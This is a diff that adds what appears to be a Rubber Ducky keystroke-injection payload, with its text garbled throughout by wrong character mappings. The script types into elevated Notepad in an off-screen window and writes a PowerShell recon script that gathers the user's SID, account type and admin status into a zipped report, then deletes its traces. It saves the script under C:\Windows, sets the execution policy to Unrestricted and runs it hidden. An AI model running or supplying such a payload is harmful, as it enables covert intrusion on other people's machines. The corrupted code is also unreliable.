@@ -1,0 +1,106 @@
+DELAY "àà
+GUI r
+DELAY &ààà
+STRING pozershell Stqrt)Process notepqd )Verb runQs
+ENTER
+DELAY "àà
+ALT y
+DELAY "àà
+ENTER
+ALT SPACE
+DELAY &ààà
+STRING ,
+DELAY &ààà
+DOZNQRROZ
+REPEQT &àà
+ENTER
+STRING 'folderDqteTi,e = 9get)dqte0:ToString9ùd)?)y HH,,ssù0
+ENTER
+STRING 'userDir = 9Get)ChildIte, envM*userprofile0:vqlue + ù*Ducky Report ù + 'folderDqteTi,e
+ENTER
+STRING 'fileSqveDir = Nez)Ite,  9'userDir0 )Ite,Type Directory 
+ENTER
+STRING 'dqte = get)dqte 
+ENTER
+STRING 'style = %.style/ tqble td¨pqdding)rightM &àpxmtext)qlignM leftm£3body ¨pqddingM(àpxmfont)fq,ilyM Helveticqm font)siweM &éptm borderM &àpx solid blqckmbqckground)colorMzhitemheightM&àà5moverflozMqutom£3left¨floqtMleftm bqckground)colorM3CàCàCàmzidthM'(5mheightMé-àpxmborderM 'px solid blqckmpqddingM&àpxm,qrginM&àpxmoverflozMscrollm£3right¨bqckground)colorM3CàCàCàmfloqtMrightmzidthM'(5mheightMé-àpxmborderM 'px solid blqckmpqddingM&àpxm,qrginM&àpxmoverflozMscrollm£3center¨bqckground)colorM3CàCàCàmzidthMç_5mheightM"ààpxmborderM 'px solid blqckmpqddingM&àpxmoverflozMscrollm,qrginM&àpxm£ .!style/%
+ENTER
+STRING 'Report = ConvertTo)Ht,l )Title ùRecon Reportù )Heqd 'style / 'fileSqveDirù!Co,puterInfo:ht,lù 
+ENTER
+STRING 'Report = 'Report + %.div id=body/.h&/Duck Tool Kit Report.!h&/.hr siwe=é/.br/.h"/ Generqted onM 'Dqte .!h"/.br/% 
+ENTER
+STRING 'UserInfo = Get)Z,iObject )clqss Zin"é°UserQccount )nq,espqce root!CI?Vé µ Zhere)Object ¨'°:Nq,e )ea 'envMUserNq,e£µ Select QccountType;SID;PqsszordReauired  
+ENTER 
+STRING 'UserType = 'UserInfo:QccountType 
+ENTER
+STRING 'UserSid = 'UserInfo:SID
+ENTER  
+STRING 'UserPqss = 'UserInfo:PqsszordReauired 
+ENTER 
+STRING 'IsQd,in = 9^Security:Principql:ZindozsPrincipql$ ^Security:Principql:ZindozsIdentity$MMGetCurrent900:IsInRole9^Security:Principql:ZindozsBuiltInRole$ ùQd,inistrqtorù0 
+ENTER 
+STRING 'Report =  'Report + %.div id=left/.h"/User Infor,qtion.!h"/.br/.tqble/.tr/.td/Current User Nq,eM.!td/.td/'envMUSERNQ?E.!td/.!tr/.tr/.td/Qccount TypeM.!td/.td/ 'UserType.!td/.!tr/.tr/.td/User SIDM.!td/.td/'UserSid.!td/.!tr/.tr/.td/Qccount Do,qinM.!td/.td/'envMUSERDO?QIN.!td/.!tr/.tr/.td/Pqsszord ReauiredM.!td/.td/'UserPqss.!td/.!tr/.tr/.td/Current User is Qd,inM.!td/.td/'IsQd,in.!td/.!tr/.!tqble/% 
+ENTER  
+STRING 'Report = 'Report + ù.!div/ù 
+ENTER
+STRING 'Report // 'fileSqveDirù!Co,puterInfo:ht,lù 
+ENTER
+STRING function copy)ToWip9'fileSqveDir0¨ 
+ENTER 
+STRING 'srcdir = 'fileSqveDir 
+ENTER
+STRING 'wipFile = ù*Report:wipù
+ENTER
+STRING if9)not 9test)pqth9'wipFile000 ¨ 
+ENTER
+STRING set)content 'wipFile 9%PK% + ^chqr$( + ^chqr$- + 9%'9^chqr$à0% 8 &_00
+ENTER 
+STRING 9dir 'wipFile0:IsReqdOnly = 'fqlse£ 
+ENTER
+STRING 'shellQpplicqtion = nez)object )co, shell:qpplicqtion
+ENTER 
+STRING 'wipPqckqge = 'shellQpplicqtion:Nq,eSpqce9'wipFile0 
+ENTER
+STRING 'files = Get)ChildIte, )Pqth 'srcdir 
+ENTER 
+STRING foreqch9'file in 'files0 ¨ 
+ENTER
+STRING 'wipPqckqge:CopyHere9'file:FullNq,e0 
+ENTER 
+STRING zhile9'wipPqckqge:Ite,s90:Ite,9'file:nq,e0 )ea 'null0¨ 
+ENTER
+STRING Stqrt)sleep )seconds & £££ 
+ENTER 
+STRING copy)ToWip9'fileSqveDir0 
+ENTER
+STRING re,ove)ite, 'fileSqveDir )recurse 
+ENTER
+STRING Re,ove)Ite, '?yINvocqtion:InvocqtionNq,e 
+ENTER
+CTRL s
+DELAY "àà    
+STRING CM*Zindozs*config)éç__é:ps&
+ENTER
+DELAY &ààà
+ALT F' 
+DELAY "àà  
+GUI r 
+DELAY (àà 
+STRING pozershell Stqrt)Process c,d )Verb runQs 
+ENTER
+DELAY &ààà
+ALT y 
+DELAY "àà   
+STRING ,ode conMcols=&' lines=& 
+ENTER
+ALT SPACE 
+DELAY "àà  
+STRING , 
+DELAY &ààà
+DOZNQRROZ 
+REPEQT &àà
+ENTER
+STRING pozershell Set)ExecutionPolicy ùUnrestrictedù )Scope CurrentUser )Confir,M'fqlse 
+ENTER 
+DELAY "àà  
+STRING pozershell:exe )zindozstyle hidden )File CM*Zindozs*config)éç__é:ps&
+ENTER
